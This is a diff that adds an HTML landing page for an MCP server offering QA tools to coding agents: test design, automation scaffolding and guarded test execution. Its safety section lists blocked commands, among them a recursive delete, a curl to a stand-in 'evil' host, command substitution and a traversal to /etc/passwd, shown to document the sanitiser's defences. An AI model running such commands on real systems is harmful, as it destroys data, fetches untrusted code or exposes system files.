@@ -1,0 +1,661 @@
+<!doctype html>
+<html lang="en" class="scroll-smooth">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Universal QA Expert Engine — MCP Skill</title>
+<meta name="description" content="An MCP server that turns Claude Code, Cursor, VS Code and Codex into a senior QA engineer. Eight tools for boundary analysis, manual test planning, UI/UX audit, automation scaffolding, API contracts and sandboxed test execution.">
+<meta property="og:title" content="Universal QA Expert Engine — MCP Skill">
+<meta property="og:description" content="Your agent can already run tests. It can't design them. This gives it the methodology.">
+<meta property="og:type" content="website">
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🧪</text></svg>">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500;600&family=IBM+Plex+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+<script src="https://cdn.tailwindcss.com"></script>
+<script>
+tailwind.config = {
+  theme: {
+    extend: {
+      colors: {
+        canvas:  '#0D1117',
+        surface: '#161B22',
+        raised:  '#1C2128',
+        edge:    '#21262D',
+        edgeSoft:'#30363D',
+        ink:     '#E6EDF3',
+        muted:   '#8B949E',
+        faint:   '#6E7681',
+        accept:  '#34D399',
+        structure:'#22D3EE',
+        reject:  '#F85149',
+      },
+      fontFamily: {
+        sans: ['"IBM Plex Sans"', 'ui-sans-serif', 'system-ui', 'sans-serif'],
+        mono: ['"IBM Plex Mono"', 'ui-monospace', 'SFMono-Regular', 'monospace'],
+      },
+      maxWidth: { reading: '68ch' },
+    },
+  },
+};
+</script>
+<style>
+  body { -webkit-font-smoothing: antialiased; text-rendering: optimizeLegibility; }
+  ::selection { background: #22D3EE33; }
+  :focus-visible { outline: 2px solid #22D3EE; outline-offset: 3px; border-radius: 2px; }
+  .rule { background: linear-gradient(90deg, #30363D 0%, #30363D 40%, transparent 100%); height: 1px; }
+  .grid-faint {
+    background-image: linear-gradient(#21262D 1px, transparent 1px), linear-gradient(90deg, #21262D 1px, transparent 1px);
+    background-size: 64px 64px;
+    mask-image: radial-gradient(ellipse 80% 55% at 50% 0%, #000 20%, transparent 75%);
+    -webkit-mask-image: radial-gradient(ellipse 80% 55% at 50% 0%, #000 20%, transparent 75%);
+  }
+  /* One orchestrated moment: the matrix fills in like a run producing results. */
+  .row-in { opacity: 0; animation: rowIn .34s cubic-bezier(.2,.7,.3,1) forwards; }
+  @keyframes rowIn { from { opacity: 0; transform: translateY(4px); } to { opacity: 1; transform: none; } }
+  @media (prefers-reduced-motion: reduce) {
+    .row-in { animation: none; opacity: 1; }
+    html { scroll-behavior: auto; }
+  }
+  pre, code { font-variant-ligatures: none; }
+  .scroll-x { overflow-x: auto; -webkit-overflow-scrolling: touch; }
+  .scroll-x::-webkit-scrollbar { height: 8px; }
+  .scroll-x::-webkit-scrollbar-thumb { background: #30363D; border-radius: 4px; }
+</style>
+</head>
+
+<body class="bg-canvas text-ink font-sans antialiased">
+
+<a href="#main" class="sr-only focus:not-sr-only focus:absolute focus:z-50 focus:m-3 focus:rounded focus:bg-structure focus:px-4 focus:py-2 focus:font-semibold focus:text-canvas">Skip to content</a>
+
+<!-- ───────────────────────── nav ───────────────────────── -->
+<header class="sticky top-0 z-40 border-b border-edge bg-canvas/85 backdrop-blur">
+  <nav class="mx-auto flex max-w-6xl items-center gap-6 px-5 py-3.5" aria-label="Primary">
+    <a href="#main" class="flex items-center gap-2.5 font-semibold tracking-tight">
+      <span class="grid h-7 w-7 place-items-center rounded bg-accept/15 text-accept" aria-hidden="true"><i class="fa-solid fa-vial-circle-check text-[13px]"></i></span>
+      <span>QA Expert Engine</span>
+    </a>
+    <div class="ml-auto hidden items-center gap-6 text-sm text-muted md:flex">
+      <a href="#install" class="transition-colors hover:text-ink">Install</a>
+      <a href="#tools" class="transition-colors hover:text-ink">Tools</a>
+      <a href="#safety" class="transition-colors hover:text-ink">Safety</a>
+      <a href="#requirements" class="transition-colors hover:text-ink">Requirements</a>
+    </div>
+    <a href="https://github.com/code-by-nanthu/mcp-qa-expert-engine"
+       class="ml-auto inline-flex items-center gap-2 rounded-md border border-edgeSoft px-3 py-1.5 text-sm font-medium transition-colors hover:border-muted hover:bg-surface md:ml-0">
+      <i class="fa-brands fa-github" aria-hidden="true"></i><span>GitHub</span>
+    </a>
+  </nav>
+</header>
+
+<main id="main">
+
+<!-- ───────────────────────── hero ───────────────────────── -->
+<section class="relative overflow-hidden border-b border-edge">
+  <div class="pointer-events-none absolute inset-0 grid-faint" aria-hidden="true"></div>
+
+  <div class="relative mx-auto max-w-6xl px-5 pb-16 pt-16 sm:pt-20">
+
+    <div class="flex flex-wrap items-center gap-2 text-[13px]">
+      <span class="rounded-full border border-accept/30 bg-accept/10 px-2.5 py-1 font-mono font-medium text-accept">v1.1.0</span>
+      <span class="rounded-full border border-edgeSoft px-2.5 py-1 text-muted">MIT licensed</span>
+      <span class="rounded-full border border-edgeSoft px-2.5 py-1 text-muted">Node 18+</span>
+      <span class="rounded-full border border-edgeSoft px-2.5 py-1 text-muted">Zero config</span>
+    </div>
+
+    <h1 class="mt-7 max-w-4xl text-4xl font-bold leading-[1.08] tracking-tight sm:text-5xl lg:text-[3.6rem]">
+      Universal QA Expert Engine
+      <span class="block text-muted">MCP Skill</span>
+    </h1>
+
+    <p class="mt-6 max-w-reading text-lg leading-relaxed text-muted">
+      Your coding agent can already run the test suite. It can&rsquo;t design one. This
+      server gives it the methodology &mdash; boundary analysis, equivalence partitioning,
+      decision tables, state machines &mdash; and a sandbox to execute in.
+    </p>
+
+    <!-- primary action: the command -->
+    <div class="mt-8 flex flex-col gap-3 sm:flex-row sm:items-center">
+      <div class="flex items-center gap-3 rounded-lg border border-edgeSoft bg-surface px-4 py-3 font-mono text-[15px]">
+        <span class="select-none text-accept" aria-hidden="true">$</span>
+        <code id="npx-cmd" class="text-ink">npx -y mcp-qa-expert-engine</code>
+        <button type="button" data-copy="#npx-cmd"
+                class="ml-2 rounded px-2 py-1 text-muted transition-colors hover:bg-raised hover:text-ink"
+                aria-label="Copy install command">
+          <i class="fa-regular fa-copy" aria-hidden="true"></i>
+        </button>
+      </div>
+      <a href="#install" class="inline-flex items-center justify-center gap-2 rounded-lg bg-accept px-5 py-3 font-semibold text-canvas transition-colors hover:bg-accept/90">
+        Add to your agent
+      </a>
+    </div>
+
+    <!-- the transformation: what you give it, what it returns -->
+    <div class="mt-14 grid gap-4 lg:grid-cols-[minmax(0,.82fr)_minmax(0,1.18fr)] lg:gap-5">
+
+      <figure class="rounded-xl border border-edge bg-surface">
+        <figcaption class="flex items-center gap-2 border-b border-edge px-4 py-2.5 text-[13px] text-faint">
+          <i class="fa-solid fa-code text-[11px]" aria-hidden="true"></i>
+          You hand it a signature
+        </figcaption>
+        <pre class="scroll-x px-4 py-4 font-mono text-[13px] leading-relaxed text-ink"><code><span class="text-structure">function</span> createBooking(seats) {
+  <span class="text-faint">// seats: min 1, max 500</span>
+}</code></pre>
+      </figure>
+
+      <figure class="rounded-xl border border-edge bg-surface">
+        <figcaption class="flex items-center gap-2 border-b border-edge px-4 py-2.5 text-[13px] text-faint">
+          <i class="fa-solid fa-table-list text-[11px]" aria-hidden="true"></i>
+          It returns a boundary matrix
+          <span class="ml-auto font-mono text-[11px] text-faint">generate_qa_matrix</span>
+        </figcaption>
+        <div class="scroll-x px-4 py-4">
+          <table class="w-full min-w-[520px] border-collapse font-mono text-[12.5px] leading-6">
+            <thead>
+              <tr class="text-left text-faint">
+                <th class="pb-2 pr-4 font-medium">Case</th>
+                <th class="pb-2 pr-4 font-medium">Input</th>
+                <th class="pb-2 pr-4 font-medium">Boundary class</th>
+                <th class="pb-2 font-medium">Expected</th>
+              </tr>
+            </thead>
+            <tbody id="matrix-rows" class="align-top">
+              <tr class="row-in" style="animation-delay:.05s"><td class="pr-4 text-structure">TC_BOOKING_001</td><td class="pr-4">seats = 0</td><td class="pr-4 text-muted">min &minus; 1</td><td class="text-reject">Reject</td></tr>
+              <tr class="row-in" style="animation-delay:.11s"><td class="pr-4 text-structure">TC_BOOKING_002</td><td class="pr-4">seats = 1</td><td class="pr-4 text-muted">min</td><td class="text-accept">Accept</td></tr>
+              <tr class="row-in" style="animation-delay:.17s"><td class="pr-4 text-structure">TC_BOOKING_003</td><td class="pr-4">seats = 2</td><td class="pr-4 text-muted">min + 1</td><td class="text-accept">Accept</td></tr>
+              <tr class="row-in" style="animation-delay:.23s"><td class="pr-4 text-structure">TC_BOOKING_004</td><td class="pr-4">seats = 499</td><td class="pr-4 text-muted">max &minus; 1</td><td class="text-accept">Accept</td></tr>
+              <tr class="row-in" style="animation-delay:.29s"><td class="pr-4 text-structure">TC_BOOKING_005</td><td class="pr-4">seats = 500</td><td class="pr-4 text-muted">max</td><td class="text-accept">Accept</td></tr>
+              <tr class="row-in" style="animation-delay:.35s"><td class="pr-4 text-structure">TC_BOOKING_006</td><td class="pr-4">seats = 501</td><td class="pr-4 text-muted">max + 1</td><td class="text-reject">Reject</td></tr>
+              <tr class="row-in" style="animation-delay:.41s"><td class="pr-4 text-structure">TC_BOOKING_007</td><td class="pr-4">seats = NaN</td><td class="pr-4 text-muted">type violation</td><td class="text-reject">Reject</td></tr>
+              <tr class="row-in" style="animation-delay:.47s"><td class="pr-4 text-structure">TC_BOOKING_008</td><td class="pr-4">seats = null</td><td class="pr-4 text-muted">null state</td><td class="text-reject">Reject</td></tr>
+            </tbody>
+          </table>
+          <p class="mt-4 border-t border-edge pt-3 text-[12px] text-faint">
+            Each case also carries pre-conditions, numbered steps, test data and a status field.
+            Truncated here for space.
+          </p>
+        </div>
+      </figure>
+    </div>
+  </div>
+</section>
+
+<!-- ───────────────────────── positioning ───────────────────────── -->
+<section class="border-b border-edge">
+  <div class="mx-auto max-w-6xl px-5 py-16">
+    <h2 class="text-2xl font-bold tracking-tight sm:text-3xl">Why not just ask the agent?</h2>
+    <p class="mt-3 max-w-reading leading-relaxed text-muted">
+      You can. The results depend entirely on how rigorously you phrase the request, and they
+      change every time you ask. Three things shift when the methodology is a tool schema
+      instead of a prompt.
+    </p>
+
+    <dl class="mt-10 grid gap-x-10 gap-y-8 sm:grid-cols-2 lg:grid-cols-3">
+      <div>
+        <dt class="flex items-center gap-2.5 font-semibold">
+          <i class="fa-solid fa-ruler-combined text-structure" aria-hidden="true"></i>
+          Consistent rigour
+        </dt>
+        <dd class="mt-2 leading-relaxed text-muted">
+          A schema can&rsquo;t forget the upper boundary. Every call produces the same
+          classes of case &mdash; min, max, the values either side, type violations, null states
+          &mdash; whoever is driving and however they phrase it.
+        </dd>
+      </div>
+      <div>
+        <dt class="flex items-center gap-2.5 font-semibold">
+          <i class="fa-solid fa-plug text-structure" aria-hidden="true"></i>
+          Works in every editor
+        </dt>
+        <dd class="mt-2 leading-relaxed text-muted">
+          Built on the open Model Context Protocol, so the same QA behaviour runs in Claude
+          Code, Cursor, VS Code, Antigravity and Codex. Nothing is tied to one vendor&rsquo;s
+          execution loop.
+        </dd>
+      </div>
+      <div>
+        <dt class="flex items-center gap-2.5 font-semibold">
+          <i class="fa-solid fa-shield-halved text-structure" aria-hidden="true"></i>
+          A guarded path to your shell
+        </dt>
+        <dd class="mt-2 leading-relaxed text-muted">
+          Test commands routed through this server are tokenised and run without a shell,
+          confined to the workspace. Injection and directory traversal are refused before
+          anything executes.
+        </dd>
+      </div>
+    </dl>
+  </div>
+</section>
+
+<!-- ───────────────────────── install ───────────────────────── -->
+<section id="install" class="scroll-mt-20 border-b border-edge">
+  <div class="mx-auto max-w-6xl px-5 py-16">
+    <h2 class="text-2xl font-bold tracking-tight sm:text-3xl">Add it to your agent</h2>
+    <p class="mt-3 max-w-reading leading-relaxed text-muted">
+      One block of JSON. There is nothing to install first &mdash; <code class="rounded bg-surface px-1.5 py-0.5 font-mono text-[13px] text-ink">npx</code>
+      fetches the package on first run and your agent starts it over stdio.
+    </p>
+
+    <div class="mt-9 grid gap-8 lg:grid-cols-[minmax(0,1fr)_320px]">
+
+      <div class="rounded-xl border border-edge bg-surface">
+        <div class="flex flex-wrap items-center gap-2 border-b border-edge px-4 py-2.5">
+          <span class="font-mono text-[13px] text-muted">claude_config.json</span>
+          <button type="button" data-copy="#config-json"
+                  class="ml-auto inline-flex items-center gap-2 rounded-md border border-edgeSoft px-2.5 py-1 text-[13px] text-muted transition-colors hover:border-muted hover:text-ink">
+            <i class="fa-regular fa-copy" aria-hidden="true"></i><span>Copy</span>
+          </button>
+        </div>
+        <pre class="scroll-x px-4 py-4 font-mono text-[13px] leading-relaxed"><code id="config-json">{
+  <span class="text-structure">"mcpServers"</span>: {
+    <span class="text-structure">"qa-expert"</span>: {
+      <span class="text-structure">"command"</span>: <span class="text-accept">"npx"</span>,
+      <span class="text-structure">"args"</span>: [<span class="text-accept">"-y"</span>, <span class="text-accept">"mcp-qa-expert-engine"</span>]
+    }
+  }
+}</code></pre>
+      </div>
+
+      <div class="rounded-xl border border-edge bg-surface p-5">
+        <h3 class="font-semibold">Where that file lives</h3>
+        <ul class="mt-4 space-y-3.5 text-[14px] leading-relaxed text-muted">
+          <li>
+            <span class="block font-medium text-ink">Claude Code</span>
+            Run <code class="font-mono text-[12.5px] text-structure">claude mcp add</code>, or edit the MCP block in your settings file.
+          </li>
+          <li>
+            <span class="block font-medium text-ink">Cursor</span>
+            Settings &rsaquo; MCP &rsaquo; Add new server, or <code class="font-mono text-[12.5px] text-structure">.cursor/mcp.json</code> in the project.
+          </li>
+          <li>
+            <span class="block font-medium text-ink">VS Code</span>
+            <code class="font-mono text-[12.5px] text-structure">.vscode/mcp.json</code>, or the MCP panel in your AI extension.
+          </li>
+          <li>
+            <span class="block font-medium text-ink">Codex &amp; Antigravity</span>
+            Any MCP-compatible client reads the same <code class="font-mono text-[12.5px] text-structure">mcpServers</code> shape.
+          </li>
+        </ul>
+        <div class="mt-5 rounded-lg border border-edgeSoft bg-raised p-3.5 text-[13px] leading-relaxed text-muted">
+          <i class="fa-solid fa-circle-info mr-1.5 text-structure" aria-hidden="true"></i>
+          Restart the editor after saving. The server reports eight tools on connect.
+        </div>
+      </div>
+    </div>
+
+    <p class="mt-6 text-[14px] text-muted">
+      Prefer a pinned version? Use
+      <code class="rounded bg-surface px-1.5 py-0.5 font-mono text-[13px] text-ink">"args": ["-y", "mcp-qa-expert-engine@1.1.0"]</code>.
+    </p>
+  </div>
+</section>
+
+<!-- ───────────────────────── tools ───────────────────────── -->
+<section id="tools" class="scroll-mt-20 border-b border-edge">
+  <div class="mx-auto max-w-6xl px-5 py-16">
+    <h2 class="text-2xl font-bold tracking-tight sm:text-3xl">Eight tools, grouped by when you reach for them</h2>
+    <p class="mt-3 max-w-reading leading-relaxed text-muted">
+      Your agent picks the right one from the schema. Parameters marked
+      <span class="font-mono text-[13px] text-accept">required</span> must be supplied;
+      the rest have sensible defaults.
+    </p>
+
+    <!-- stage 1 -->
+    <div class="mt-12">
+      <div class="flex items-baseline gap-3">
+        <h3 class="text-lg font-semibold">Design the tests</h3>
+        <div class="rule flex-1" aria-hidden="true"></div>
+      </div>
+
+      <div class="mt-6 grid gap-4 md:grid-cols-3">
+
+        <article class="rounded-xl border border-edge bg-surface p-5 transition-colors hover:border-edgeSoft">
+          <div class="flex items-center gap-2.5">
+            <i class="fa-solid fa-border-all text-accept" aria-hidden="true"></i>
+            <h4 class="font-mono text-[14px] font-semibold text-ink">generate_qa_matrix</h4>
+          </div>
+          <p class="mt-3 text-[14px] leading-relaxed text-muted">
+            Reads a function signature, TypeScript interface, git diff or markdown requirement
+            list. Returns boundary value cases, equivalence partitions, a decision table, a
+            state transition model and exploratory charters.
+          </p>
+          <dl class="mt-4 space-y-1.5 border-t border-edge pt-3.5 font-mono text-[12.5px]">
+            <div class="flex gap-2"><dt class="text-structure">codeSnippet</dt><dd class="text-accept">required</dd></div>
+          </dl>
+        </article>
+
+        <article class="rounded-xl border border-edge bg-surface p-5 transition-colors hover:border-edgeSoft">
+          <div class="flex items-center gap-2.5">
+            <i class="fa-solid fa-clipboard-check text-accept" aria-hidden="true"></i>
+            <h4 class="font-mono text-[14px] font-semibold text-ink">generate_manual_test_plan</h4>
+          </div>
+          <p class="mt-3 text-[14px] leading-relaxed text-muted">
+            A plan a human can execute: environment setup, happy path, negative and boundary
+            passes, contextual edge cases, timeboxed exploratory charters, a defect template
+            and exit criteria.
+          </p>
+          <dl class="mt-4 space-y-1.5 border-t border-edge pt-3.5 font-mono text-[12.5px]">
+            <div class="flex gap-2"><dt class="text-structure">featureSpec</dt><dd class="text-accept">required</dd></div>
+            <div class="flex flex-wrap gap-x-2"><dt class="text-structure">depth</dt><dd class="text-muted">smoke | standard | exhaustive</dd></div>
+          </dl>
+        </article>
+
+        <article class="rounded-xl border border-edge bg-surface p-5 transition-colors hover:border-edgeSoft">
+          <div class="flex items-center gap-2.5">
+            <i class="fa-solid fa-mobile-screen text-accept" aria-hidden="true"></i>
+            <h4 class="font-mono text-[14px] font-semibold text-ink">generate_ui_ux_checklist</h4>
+          </div>
+          <p class="mt-3 text-[14px] leading-relaxed text-muted">
+            Responsive breakpoints, a Blink/WebKit/Gecko matrix, visual regression targets,
+            component states, WCAG 2.1 AA criteria, usability metrics, and your highest-risk
+            flows ranked for manual checking.
+          </p>
+          <dl class="mt-4 space-y-1.5 border-t border-edge pt-3.5 font-mono text-[12.5px]">
+            <div class="flex gap-2"><dt class="text-structure">requirements</dt><dd class="text-accept">required</dd></div>
+            <div class="flex flex-wrap gap-x-2"><dt class="text-structure">scope</dt><dd class="text-muted">full | responsive | accessibility | ux</dd></div>
+          </dl>
+        </article>
+      </div>
+    </div>
+
+    <!-- stage 2 -->
+    <div class="mt-12">
+      <div class="flex items-baseline gap-3">
+        <h3 class="text-lg font-semibold">Generate the code</h3>
+        <div class="rule flex-1" aria-hidden="true"></div>
+      </div>
+
+      <div class="mt-6 grid gap-4 md:grid-cols-2">
+
+        <article class="rounded-xl border border-edge bg-surface p-5 transition-colors hover:border-edgeSoft">
+          <div class="flex items-center gap-2.5">
+            <i class="fa-solid fa-robot text-accept" aria-hidden="true"></i>
+            <h4 class="font-mono text-[14px] font-semibold text-ink">generate_automation_script</h4>
+          </div>
+          <p class="mt-3 text-[14px] leading-relaxed text-muted">
+            A Page Object Model plus spec from a plain-language flow. At full coverage it also
+            emits data-driven cases, responsive and visual regression specs, component state
+            tests, an axe accessibility spec and a Gherkin feature file. Waits are always
+            condition-based &mdash; never a fixed sleep.
+          </p>
+          <dl class="mt-4 space-y-1.5 border-t border-edge pt-3.5 font-mono text-[12.5px]">
+            <div class="flex flex-wrap gap-x-2"><dt class="text-structure">framework</dt><dd class="text-accept">required</dd><dd class="text-muted">playwright | cypress | jest</dd></div>
+            <div class="flex gap-2"><dt class="text-structure">flowDescription</dt><dd class="text-accept">required</dd></div>
+            <div class="flex flex-wrap gap-x-2"><dt class="text-structure">coverage</dt><dd class="text-muted">functional | full</dd></div>
+          </dl>
+        </article>
+
+        <article class="rounded-xl border border-edge bg-surface p-5 transition-colors hover:border-edgeSoft">
+          <div class="flex items-center gap-2.5">
+            <i class="fa-solid fa-right-left text-accept" aria-hidden="true"></i>
+            <h4 class="font-mono text-[14px] font-semibold text-ink">generate_api_contract_tests</h4>
+          </div>
+          <p class="mt-3 text-[14px] leading-relaxed text-muted">
+            Parses REST routes, OpenAPI paths or GraphQL operations into contract tests:
+            the right status codes per verb, a missing-field case per field, schema and
+            content-type assertions, and checks that error bodies leak no internals.
+          </p>
+          <dl class="mt-4 space-y-1.5 border-t border-edge pt-3.5 font-mono text-[12.5px]">
+            <div class="flex gap-2"><dt class="text-structure">apiSpec</dt><dd class="text-accept">required</dd></div>
+            <div class="flex flex-wrap gap-x-2"><dt class="text-structure">framework</dt><dd class="text-muted">supertest | playwright | pytest</dd></div>
+          </dl>
+        </article>
+      </div>
+    </div>
+
+    <!-- stage 3 -->
+    <div class="mt-12">
+      <div class="flex items-baseline gap-3">
+        <h3 class="text-lg font-semibold">Run it and read the wreckage</h3>
+        <div class="rule flex-1" aria-hidden="true"></div>
+      </div>
+
+      <div class="mt-6 grid gap-4 md:grid-cols-2">
+
+        <article class="rounded-xl border border-edge bg-surface p-5 transition-colors hover:border-edgeSoft">
+          <div class="flex items-center gap-2.5">
+            <i class="fa-solid fa-terminal text-accept" aria-hidden="true"></i>
+            <h4 class="font-mono text-[14px] font-semibold text-ink">run_local_test_suite</h4>
+          </div>
+          <p class="mt-3 text-[14px] leading-relaxed text-muted">
+            Runs your suite and hands back status, exit code, duration and the full output.
+            A failing suite comes back as a readable result your agent can diagnose, not a
+            crash. Bounded at five minutes and 10&nbsp;MB.
+          </p>
+          <dl class="mt-4 space-y-1.5 border-t border-edge pt-3.5 font-mono text-[12.5px]">
+            <div class="flex gap-2"><dt class="text-structure">command</dt><dd class="text-accept">required</dd></div>
+          </dl>
+        </article>
+
+        <article class="rounded-xl border border-edge bg-surface p-5 transition-colors hover:border-edgeSoft">
+          <div class="flex items-center gap-2.5">
+            <i class="fa-solid fa-bug text-accept" aria-hidden="true"></i>
+            <h4 class="font-mono text-[14px] font-semibold text-ink">parse_error_logs</h4>
+          </div>
+          <p class="mt-3 text-[14px] leading-relaxed text-muted">
+            Turns a raw stack trace into a defect record: error class, severity, the first
+            frame that is actually your code, environment details pulled from the log, repro
+            steps and fix suggestions. Can render straight to Jira markup.
+          </p>
+          <dl class="mt-4 space-y-1.5 border-t border-edge pt-3.5 font-mono text-[12.5px]">
+            <div class="flex gap-2"><dt class="text-structure">rawLogs</dt><dd class="text-accept">required</dd></div>
+            <div class="flex flex-wrap gap-x-2"><dt class="text-structure">format</dt><dd class="text-muted">json | jira | both</dd></div>
+          </dl>
+        </article>
+      </div>
+    </div>
+
+    <!-- stage 4 -->
+    <div class="mt-12">
+      <div class="flex items-baseline gap-3">
+        <h3 class="text-lg font-semibold">Plan the programme</h3>
+        <div class="rule flex-1" aria-hidden="true"></div>
+      </div>
+
+      <div class="mt-6">
+        <article class="rounded-xl border border-edge bg-surface p-5 transition-colors hover:border-edgeSoft">
+          <div class="flex items-center gap-2.5">
+            <i class="fa-solid fa-diagram-project text-accept" aria-hidden="true"></i>
+            <h4 class="font-mono text-[14px] font-semibold text-ink">generate_test_strategy</h4>
+          </div>
+          <p class="mt-3 max-w-reading text-[14px] leading-relaxed text-muted">
+            Reads your project context &mdash; domain, scale, compliance regime &mdash; and writes the
+            strategy: pyramid allocation, which test types at what cadence, a non-functional
+            plan covering load through accessibility, release gates, CI policy, exit criteria,
+            closure metrics, and an honest statement of what it does not cover.
+          </p>
+          <dl class="mt-4 flex flex-wrap gap-x-6 gap-y-1.5 border-t border-edge pt-3.5 font-mono text-[12.5px]">
+            <div class="flex gap-2"><dt class="text-structure">projectContext</dt><dd class="text-accept">required</dd></div>
+            <div class="flex flex-wrap gap-x-2"><dt class="text-structure">riskProfile</dt><dd class="text-muted">prototype | standard | regulated</dd></div>
+          </dl>
+        </article>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ───────────────────────── safety ───────────────────────── -->
+<section id="safety" class="scroll-mt-20 border-b border-edge">
+  <div class="mx-auto max-w-6xl px-5 py-16">
+    <h2 class="text-2xl font-bold tracking-tight sm:text-3xl">What it will refuse to run</h2>
+    <p class="mt-3 max-w-reading leading-relaxed text-muted">
+      <code class="rounded bg-surface px-1.5 py-0.5 font-mono text-[13px] text-ink">run_local_test_suite</code>
+      executes real commands on your machine, so it is the one tool with teeth. Commands are
+      tokenised into an argument array and run with no shell at all, which makes injection
+      structurally impossible rather than filtered. A sanitiser still runs first.
+    </p>
+
+    <div class="mt-9 grid gap-4 md:grid-cols-2">
+      <div class="rounded-xl border border-reject/25 bg-reject/[0.04] p-5">
+        <h3 class="flex items-center gap-2.5 font-semibold">
+          <i class="fa-solid fa-ban text-reject" aria-hidden="true"></i>
+          Refused before anything executes
+        </h3>
+        <ul class="mt-4 space-y-2.5 font-mono text-[13px] leading-relaxed">
+          <li class="flex gap-3"><span class="text-reject" aria-hidden="true">&times;</span><span><span class="text-ink">npm test; rm -rf /</span><span class="block text-faint">shell metacharacter</span></span></li>
+          <li class="flex gap-3"><span class="text-reject" aria-hidden="true">&times;</span><span><span class="text-ink">npm test &amp;&amp; curl evil.sh</span><span class="block text-faint">command chaining</span></span></li>
+          <li class="flex gap-3"><span class="text-reject" aria-hidden="true">&times;</span><span><span class="text-ink">npm test $(whoami)</span><span class="block text-faint">substitution</span></span></li>
+          <li class="flex gap-3"><span class="text-reject" aria-hidden="true">&times;</span><span><span class="text-ink">sudo rm -rf .</span><span class="block text-faint">destructive token</span></span></li>
+          <li class="flex gap-3"><span class="text-reject" aria-hidden="true">&times;</span><span><span class="text-ink">pytest ../../etc/passwd</span><span class="block text-faint">escapes the workspace</span></span></li>
+        </ul>
+      </div>
+
+      <div class="rounded-xl border border-accept/25 bg-accept/[0.04] p-5">
+        <h3 class="flex items-center gap-2.5 font-semibold">
+          <i class="fa-solid fa-circle-check text-accept" aria-hidden="true"></i>
+          Permitted runners
+        </h3>
+        <p class="mt-4 font-mono text-[13px] leading-7 text-ink">
+          npm &middot; npx &middot; yarn &middot; pnpm &middot; bun &middot; node &middot; python &middot; python3 &middot;
+          pytest &middot; jest &middot; vitest &middot; mocha &middot; playwright &middot; cypress
+        </p>
+        <ul class="mt-5 space-y-2 border-t border-accept/15 pt-4 text-[14px] leading-relaxed text-muted">
+          <li>Paths confined to the workspace, symlinks resolved.</li>
+          <li>Five minute timeout, 10&nbsp;MB output buffer.</li>
+          <li>Subprocess output is captured, never piped to the protocol stream.</li>
+        </ul>
+      </div>
+    </div>
+
+    <p class="mt-7 max-w-reading text-[14px] leading-relaxed text-faint">
+      To be precise about the boundary: these rules govern commands routed through this
+      server. They are not a sandbox around your agent &mdash; if it has its own shell access,
+      that is unaffected. What they guarantee is that QA execution requested through these
+      tools cannot be turned into arbitrary shell execution.
+    </p>
+  </div>
+</section>
+
+<!-- ───────────────────────── requirements ───────────────────────── -->
+<section id="requirements" class="scroll-mt-20 border-b border-edge">
+  <div class="mx-auto max-w-6xl px-5 py-16">
+    <h2 class="text-2xl font-bold tracking-tight sm:text-3xl">Before you install</h2>
+
+    <div class="mt-9 grid gap-x-10 gap-y-9 sm:grid-cols-2 lg:grid-cols-4">
+      <div>
+        <h3 class="flex items-center gap-2 font-semibold"><i class="fa-brands fa-node-js text-accept" aria-hidden="true"></i>Runtime</h3>
+        <p class="mt-2.5 text-[14px] leading-relaxed text-muted">Node.js 18 or newer. Nothing else to install &mdash; the package ships one dependency, the MCP SDK.</p>
+      </div>
+      <div>
+        <h3 class="flex items-center gap-2 font-semibold"><i class="fa-solid fa-laptop-code text-accept" aria-hidden="true"></i>Clients</h3>
+        <p class="mt-2.5 text-[14px] leading-relaxed text-muted">Any MCP-compatible editor: Claude Code, Cursor, VS Code, Antigravity, Codex.</p>
+      </div>
+      <div>
+        <h3 class="flex items-center gap-2 font-semibold"><i class="fa-solid fa-folder-open text-accept" aria-hidden="true"></i>Workspace</h3>
+        <p class="mt-2.5 text-[14px] leading-relaxed text-muted">Start the server from your project root. That directory becomes the boundary every path is checked against.</p>
+      </div>
+      <div>
+        <h3 class="flex items-center gap-2 font-semibold"><i class="fa-solid fa-flask-vial text-accept" aria-hidden="true"></i>Verification</h3>
+        <p class="mt-2.5 text-[14px] leading-relaxed text-muted">105 checks cover the protocol, all eight tools, and every injection and traversal case shown above.</p>
+      </div>
+    </div>
+
+    <div class="mt-11 rounded-xl border border-edge bg-surface p-5">
+      <h3 class="font-semibold">If the server doesn&rsquo;t appear</h3>
+      <ul class="mt-4 grid gap-3 text-[14px] leading-relaxed text-muted sm:grid-cols-2">
+        <li><span class="font-medium text-ink">No tools listed.</span> Restart the editor &mdash; most clients only read MCP config at startup.</li>
+        <li><span class="font-medium text-ink">Command not found.</span> Check <code class="font-mono text-[12.5px] text-structure">node --version</code> reports 18 or higher and that npx is on your PATH.</li>
+        <li><span class="font-medium text-ink">A command was refused.</span> That is the sanitiser. Send a single runner invocation with no chaining or redirection.</li>
+        <li><span class="font-medium text-ink">Want to see it directly?</span> Run <code class="font-mono text-[12.5px] text-structure">npx -y mcp-qa-expert-engine</code> in a terminal; it reports the tool count on stderr and waits for JSON-RPC on stdin.</li>
+      </ul>
+    </div>
+  </div>
+</section>
+
+<!-- ───────────────────────── closing ───────────────────────── -->
+<section class="border-b border-edge">
+  <div class="mx-auto max-w-6xl px-5 py-16 text-center">
+    <h2 class="text-2xl font-bold tracking-tight sm:text-3xl">Give your agent the methodology</h2>
+    <p class="mx-auto mt-3 max-w-reading leading-relaxed text-muted">
+      One JSON block, eight tools, no accounts and no telemetry.
+    </p>
+    <div class="mt-8 flex flex-col items-center justify-center gap-3 sm:flex-row">
+      <div class="flex items-center gap-3 rounded-lg border border-edgeSoft bg-surface px-4 py-3 font-mono text-[15px]">
+        <span class="select-none text-accept" aria-hidden="true">$</span>
+        <code id="npx-cmd-2">npx -y mcp-qa-expert-engine</code>
+        <button type="button" data-copy="#npx-cmd-2"
+                class="ml-2 rounded px-2 py-1 text-muted transition-colors hover:bg-raised hover:text-ink"
+                aria-label="Copy install command">
+          <i class="fa-regular fa-copy" aria-hidden="true"></i>
+        </button>
+      </div>
+      <a href="https://github.com/code-by-nanthu/mcp-qa-expert-engine"
